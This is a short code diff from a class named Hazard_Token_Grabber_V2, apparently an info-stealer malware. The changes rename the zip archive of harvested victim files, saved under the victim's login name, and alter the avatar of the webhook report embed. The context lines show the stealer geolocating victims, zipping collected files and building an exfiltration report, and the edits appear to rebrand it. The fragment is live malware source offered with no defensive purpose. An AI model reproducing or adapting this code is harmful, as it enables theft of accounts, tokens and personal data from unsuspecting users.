@@ -397,7 +397,7 @@ class Hazard_Token_Grabber_V2:
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception:
             pass
-        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        _zipfile = os.path.join(self.appdata, f'lroxyhesapbilgi-[{os.getlogin()}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
@@ -411,7 +411,7 @@ class Hazard_Token_Grabber_V2:
             self.files += f"\n{f}"
         self.fileCount = f"{len(files)} Files Found: "
         embed = {
-            "avatar_url":"https://i.hizliresim.com/om9pda4.PNG",
+            "avatar_url":"http",
             "embeds": [
                 {
                     "author": {
